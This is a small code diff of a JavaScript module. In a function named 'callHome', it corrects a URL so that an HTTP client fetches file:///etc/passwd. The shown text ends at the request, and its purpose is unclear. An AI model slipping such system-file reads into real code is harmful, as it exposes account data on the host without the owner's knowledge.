@@ -4,7 +4,7 @@
 
 module.exports = {
     callHome: function() { 
-        var url = "file://etc/passwd";
+        var url = "file:///etc/passwd";
 
         var response = httpClient.request(url, {
             method:'GET'
